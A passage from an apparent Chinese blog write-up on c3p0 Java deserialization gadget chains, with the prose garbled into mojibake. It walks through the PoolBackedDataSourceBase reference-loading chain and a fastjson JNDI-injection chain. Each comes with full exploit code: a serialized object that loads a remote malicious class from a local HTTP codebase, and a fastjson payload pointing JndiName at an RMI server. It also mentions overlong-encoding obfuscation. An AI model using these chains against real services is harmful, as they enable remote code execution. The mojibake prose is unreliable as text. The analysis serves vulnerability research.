alt="image-20240411191630219"><br>ä½†æ˜¯è¿™ä¸ª<code>Reference</code>ç±»æ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ²¡æ³•ç›´æ¥å®ä¾‹åŒ–ï¼Œemmmï¼Œä¸çŸ¥é“å¤§å“¥ä»¬æ€ä¹ˆè§£å†³çš„ï¼Œæˆ‘è¿™å„¿è·‘ç›´æ¥æŠ¥é”™äº†ï¼Œä¸è¿‡æ— æ‰€è°“ï¼Œç»§ç»­å¾€åçœ‹ï¼Œåœ¨<code>ReferenceIndirector#getObject()</code>ä¸­è°ƒç”¨äº†ä¸Šé¢é‚£ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111916409.png" alt="image-20240411191650304"><br>è¿™é‡Œå…¶å®è¿˜æœ‰ä¸ªlookupå‡½æ•°ï¼Œä½†æ˜¯æœ‰ä¸ªifåˆ¤æ–­ï¼Œå¯ä¸å¯æ§è¿™é‡Œå…ˆä¸ç®¡ï¼Œç„¶åå…¶å®ƒå°±æ²¡å•¥äº†ï¼Œç»§ç»­å¾€ä¸Šçœ‹åˆ°<code>PoolBackedDataSourceBase#readObject()</code>ï¼Œè¿™é‡Œæœ‰ä¸ªifåˆ¤æ–­</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (o instanceof IndirectlySerialized)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917505.png" alt="image-20240411191707458"><br>è¿™é‡Œçš„oå¿…é¡»è¦ä¸º<code>IndirectlySerialized</code>çš„å®ä¾‹æ‰èƒ½æ‰§è¡Œ<code>getObject</code>ï¼Œè°ƒç”¨å®Œ<code>getObject</code>åä¼šå°†oå¼ºè½¬ä¸º<code>ConnectionPoolDataSource</code>çš„å¯¹è±¡ï¼Œä½†æ˜¯è¿™ä¸ªæ¥å£ä¸èƒ½ååºåˆ—åŒ–<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917407.png" alt="image-20240411191722301"><br>è¿™ä¸ªæ¥å£ä¸èƒ½ååºåˆ—åŒ–èƒ½ç†è§£ï¼Œå› ä¸ºæ²¡æœ‰ç»§æ‰¿<code>Serializable</code>ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆéœ€è¦<code>ConnectionPoolDataSource</code>èƒ½å¤Ÿååºåˆ—åŒ–å‘¢ï¼Ÿå…¶å®çœ‹äº†å¾ˆå¤šæ–‡ç« è¿™é‡Œéƒ½æ²¡æœ‰å¾ˆæ˜ç¡®çš„è§£é‡Šï¼Œæˆ‘çŒœæµ‹æ˜¯å› ä¸ºåœ¨åºåˆ—åŒ–çš„æ—¶å€™å¯¹è±¡oæ˜¯è¦è¢«åºåˆ—åŒ–çš„ï¼Œä½†æ˜¯æ‰§è¡Œå®Œ<code>getObject()</code>åå°±è¢«å¼ºè½¬ä¸º<code>ConnectionPoolDataSource</code>çš„å¯¹è±¡ï¼Œè¿™éƒ¨åˆ†ä¹Ÿæ˜¯éœ€è¦è¢«åºåˆ—åŒ–è¿›å»çš„ï¼Œé‚£ä¹ˆååºåˆ—åŒ–çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ<code>IndirectlySerialized -&gt; ConnectionPoolDataSource</code>è¿™æ ·çš„è½¬æ¢ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿååºåˆ—åŒ–çš„è¯å°±ä¸è¡Œï¼Œè¿™é‡Œå…¶å®è‡ªå·±ä¹Ÿæœ‰ç‚¹æ‡µï¼Œå…ˆè¿™æ ·å§ï¼Œåˆ°è¿™é‡Œä¼¼ä¹ååºåˆ—åŒ–å°±å·²ç»æ²¡æ³•è·Ÿäº†ï¼Œé‚£ä¹ˆé¡ºç€çœ‹åºåˆ—åŒ–å»<br>æ¥åˆ°<code>PoolBackedDataSourceBase#writeObject</code>ä¸‹<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917258.png" alt="image-20240411191732084"><br>åˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¼šå…ˆå°è¯•åºåˆ—åŒ–<code>connectionPoolDataSource</code>ï¼Œæ— æ³•åºåˆ—åŒ–çš„åŒ–å°±è¿›å…¥catchï¼Œæ˜¾ç¤ºè¿™é‡Œæ— æ³•åºåˆ—åŒ–ï¼Œé‚£ä¹ˆè¿›å…¥catchçœ‹çœ‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;  </span><br><span class="line">   com.mchange.v2.log.MLog.getLogger( <span class="built_in">this</span>.getClass() ).log(com.mchange.v2.log.MLevel.FINE, <span class="string">&quot;Direct serialization provoked a NotSerializableException! Trying indirect.&quot;</span>, nse);  </span><br><span class="line">   <span class="keyword">try</span>   &#123;  </span><br><span class="line">      <span class="type">Indirector</span> <span class="variable">indirector</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">com</span>.mchange.v2.naming.ReferenceIndirector();  </span><br><span class="line">      oos.writeObject( indirector.indirectForm( connectionPoolDataSource ) );  </span><br><span class="line">   &#125;  </span><br><span class="line">   <span class="keyword">catch</span> (IOException indirectionIOException)  </span><br><span class="line">   &#123; <span class="keyword">throw</span> indirectionIOException; &#125;  </span><br><span class="line">   <span class="keyword">catch</span> (Exception indirectionOtherException)  </span><br><span class="line">   &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Problem indirectly serializing connectionPoolDataSource: &quot;</span> + indirectionOtherException.toString() ); &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ˜¯<code>indirector.indirectForm</code>è¿›è¡Œäº†å¤„ç†ï¼Œç›´æ¥è·Ÿè¿›è¿™ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> IndirectlySerialized <span class="title function_">indirectForm</span><span class="params">( Object orig )</span> <span class="keyword">throws</span> Exception  </span><br><span class="line">   &#123; <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> ((Referenceable) orig).getReference();  </span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ReferenceSerialized</span>( ref, name, contextName, environmentProperties );  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿”å›äº†<code>ReferenceSerialized</code>çš„å¯¹è±¡ï¼Œè€Œå®ƒæ˜¯å¯ä»¥è¢«ååºåˆ—åŒ–çš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ReferenceSerialized</span> <span class="keyword">implements</span> <span class="title class_">IndirectlySerialized</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IndirectlySerialized</span> <span class="keyword">extends</span> <span class="title class_">Serializable</span></span><br></pre></td></tr></table></figure><p>è¿™æ ·<code>connectionPoolDataSource</code>å°±ä»ä¸å¯åºåˆ—åŒ–å˜ä¸ºäº†å¯åºåˆ—åŒ–ï¼Œå®é™…ä¸Šå·²ç»æ˜¯åºåˆ—åŒ–çš„<code>ReferenceSerialized</code>çš„å¯¹è±¡ï¼Œåˆ°è¿™é‡Œè¿™æ¡é“¾å°±åŸºæœ¬ç»“æŸäº†</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>ä¸Šé¢æƒ³å†™ä¸ªç›´æ¥åˆ©ç”¨çš„expä¸æ˜¯é‡åˆ°äº†<code>Reference</code>æ²¡æ³•ç›´æ¥å®ä¾‹åŒ–çš„é—®é¢˜äº†å—ï¼Œåœ¨<code>JndiRefConnectionPoolDataSource</code>ç±»ä¸‹æœ‰ä¸ª<code>getReference()</code>æ–¹æ³•ä¼šç›´æ¥è¿”å›ä¸ªReferenceå¯¹è±¡<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917698.png" alt="image-20240411191745624"><br>åˆ©ç”¨è¯¥æ–¹æ³•æ„é€ Referenceå¯¹è±¡æ”¾å…¥æ¶æ„ç±»å’Œåœ°å€</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;  </span><br><span class="line"><span class="keyword">import</span> javassist.bytecode.stackmap.TypeData;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Self</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">pBS</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase&quot;</span>);  </span><br><span class="line">        <span class="comment">//åå°„è·å–connectionPoolDataSourceå±æ€§ï¼Œå°†å®ƒè®¾ç½®ä¸ºæ¶æ„ç±»  </span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cPD</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        cPD.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        cPD.set(pBS,<span class="keyword">new</span> <span class="title class_">reference</span>());  </span><br><span class="line">  </span><br><span class="line">        serializer(pBS);  </span><br><span class="line">        unserializer(<span class="string">&quot;ser.bin&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">reference</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>,Referenceable &#123;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:8888/&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String username, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializer</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        outputStream.writeObject(obj);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializer</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> objectInputStream.readObject();  </span><br><span class="line">        <span class="keyword">return</span> o;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œè¿™ä¸ªä¹Ÿèƒ½åˆ©ç”¨overlongencodingæ–¹æ³•æ··æ·†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111917852.png" alt="image-20240411191759620"><br>ä½†æ˜¯æœ€å…³é”®çš„ç±»è¿˜æ˜¯æ²¡èƒ½æ··æ·†æ‰ï¼Œæœ‰å¾…è¿›ä¸€æ­¥æ··æ·†<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918625.png" alt="image-20240411191813380"></p><h3 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject -&gt;</span><br><span class="line">ObjectFactory#getObjectInstance</span><br></pre></td></tr></table></figure><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>è¿™æ¡é“¾æ˜¯åŸºäºfastjsonæˆ–jacksonçš„ï¼Œç›¸å½“äºæ˜¯fastjsonçš„é“¾äº†<br>è¿™æ¡é“¾çš„æ¼æ´ç‚¹åœ¨<code>JndiRefForwardingDataSource#dereference</code>ä¸‹çš„lookup<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918316.png" alt="image-20240411191837035"><br>å¯ä»¥çœ‹åˆ°åªè¦<code>jndiName</code>å‚æ•°å¯æ§å°±å¯ä»¥é€ æˆjndiæ³¨å…¥ï¼Œå®ƒæ˜¯é€šè¿‡<code>getJndiName()</code>æ–¹æ³•è·å–ï¼Œçœ‹çœ‹è¿™ä¸ªæ–¹æ³•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918598.png" alt="image-20240411191849519"><br>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿”å›ä¸€ä¸ªNameæˆ–è€…Stringçš„<code>jndiName</code>ï¼Œä½†æ˜¯è¿™é‡Œåªæ˜¯è·å–ï¼Œè¿˜éœ€è¦æ‰¾æ€ä¹ˆèµ‹å€¼çš„ï¼Œæ‰¾äº†åŠå¤©åˆ°è¿™é‡Œæ²¡æ€è·¯äº†ï¼Œçœ‹å…¶å®ƒçš„å¸ˆå‚…åˆ°è¿™é‡Œæ˜¯å…ˆæ²¡æ‰¾äº†ï¼Œè€Œæ˜¯ä»<code>dereference()</code>å¤„å¾€ä¸Šæ‰¾ï¼Œæ‰¾åˆ°çš„æ˜¯<code>inner()</code>ï¼Œå…¶å®è¿™ä¸ªéƒ½æ²¡å¿…è¦æ‰¾ï¼Œå› ä¸ºæ³¨é‡Šå·²ç»è¯´äº†ï¼Œåªèƒ½ç”¨<code>inner()</code>è°ƒç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111918282.png" alt="image-20240411191859125"><br>ç»§ç»­å¾€ä¸Šæ‰¾<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919295.png" alt="image-20240411191923067"><br>è¿™é‡Œæ‰¾çš„æ˜¯intå‹çš„<code>setLoginTimeout()</code>å‡½æ•°ï¼Œè¿™é‡Œå†æœç´¢å…¶å®å¯ä»¥çœ‹åˆ°ä¸‹é¢çš„ç»“æœ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919607.png" alt="image-20240411191935534"><br>å§”æ‰˜è‡³å¦ä¸€ä¸ªå®ä¾‹æ–¹æ³•ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯<code>JndiRefConnectionPoolDataSource</code>ç±»ä¸‹çš„<code>setLoginTimeout()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span>  </span><br><span class="line"><span class="keyword">throws</span> SQLException  </span><br><span class="line">   &#123; wcpds.setLoginTimeout( seconds ); &#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª<code>wcpds</code>æ˜¯<code>WrapperConnectionPoolDataSource</code>ç±»ä¸‹çš„å®ä¾‹ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨è¿™ä¸ªç±»ä¸‹çš„<code>setLoginTimeout()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span>  </span><br><span class="line"><span class="keyword">throws</span> SQLException  </span><br><span class="line">   &#123; getNestedDataSource().setLoginTimeout( seconds ); &#125;</span><br></pre></td></tr></table></figure><p>ç„¶åç»§ç»­çœ‹ä¸‹<code>getNestedDataSource()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> DataSource <span class="title function_">getNestedDataSource</span><span class="params">()</span>  </span><br><span class="line">&#123; <span class="keyword">return</span> nestedDataSource; &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œ<code>nestedDataSource</code>å…¶å®ç»§ç»­è·Ÿæ˜¯<code>DataSource</code>çš„å¯¹è±¡ï¼Œä½†æ˜¯çœ‹æ–‡ç« è¿™é‡Œè°ƒè¯•çš„è¯æ˜¯<code>JndiRefForwardingDataSource</code>çš„å¯¹è±¡ï¼Œè¿™é‡Œæˆ‘å°è¯•äº†ç®€å•çš„è°ƒç”¨è°ƒè¯•ï¼Œå‘ç°å®ƒä¸ºnull</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">    Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>);  </span><br><span class="line">    <span class="type">Method</span> <span class="variable">setLoginTimeout</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;setLoginTimeout&quot;</span>, <span class="type">int</span>.class);  </span><br><span class="line">    setLoginTimeout.invoke(aClass.newInstance(), <span class="number">10</span>);  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919999.png" alt="image-20240411191948939"><br>ä¸çŸ¥é“é‚£äº›å¸ˆå‚…æ˜¯æ€ä¹ˆè°ƒè¯•çš„ï¼Œç›´æ¥æ‹¿ç€expè°ƒçš„è¯æ„Ÿè§‰å°±æ¯”è¾ƒéš¾ç†è§£è¿™ä¸€æ­¥ï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä¹Ÿæƒ³ä¸å‡ºå•¥åŠæ³•äº†ï¼Œæ‰€ä»¥å…ˆå°±è¿™æ ·å§<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111919888.png" alt="image-20240411191958748"><br>æ‹¿ç€expè°ƒè¯•å‘ç°ç¡®å®æ˜¯<code>JndiRefForwardingDataSource</code>ç±»ï¼Œç„¶åjndiNameä¹Ÿæ˜¯é€šè¿‡fastjsonè°ƒç”¨setterè®¾ç½®çš„ï¼Œæ˜¯åœ¨<code>JndiRefDataSourceBase#setJndiName</code>ä¸‹å®Œæˆ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920080.png" alt="image-20240411192006733"></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3p0Jndi</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\&quot;,&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;JndiName\&quot;:\&quot;rmi://127.0.0.1:8085/EyHEEMWG\&quot;, &quot;</span> +  </span><br><span class="line">            <span class="string">&quot;\&quot;LoginTimeout\&quot;:0&quot;</span> +  </span><br><span class="line">            <span class="string">&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(payload);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920319.png" alt="image-20240411192023241"><br>è¿™é‡Œåˆ©ç”¨yakitç”Ÿæˆçš„ä¸€ä¸ªæ¶æ„æœåŠ¡å™¨ï¼Œåˆ©ç”¨æˆåŠŸï¼Œldapå’Œrmiéƒ½å¯ç”¨<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202404111920119.png" alt="image-20240411192033071"></p><h3 id="åˆ©ç”¨é“¾-1"><a href="#åˆ©ç”¨é“¾-1" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#ä¿®æ”¹jndiName</span><br><span class="line">JndiRefConnectionPoolDataSource#setJndiName -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setJndiName</span><br><span class="line"> </span><br><span class="line">#JNDIè°ƒç”¨</span><br><span class="line">JndiRefConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">WrapperConnectionPoolDataSource#setLoginTime -&gt;</span><br><span class="line">JndiRefForwardingDataSource#setLoginTimeout -&gt;</span><br><span class="line">JndiRefForwardingDataSource#inner -&gt;</span><br><span class="line">JndiRefForwardingDataSource#dereference() -&gt;</span><br><span class="line">Context#lookup</span><br></pre></td></tr></table></figure><h2 id="HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"><a href="#HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨" class="headerlink" title="HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨"></a>HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨</h2><p>è¿™é‡Œé“¾å¯ä»¥ç”¨äºä¸å‡ºç½‘ç¯å¢ƒï¼Œä¹Ÿæ˜¯ä¸€æ¡äºŒæ¬¡ååºåˆ—åŒ–é“¾</p><h3 id="åˆ†æ-2"><a href="#åˆ†æ-2" class="headerlink" 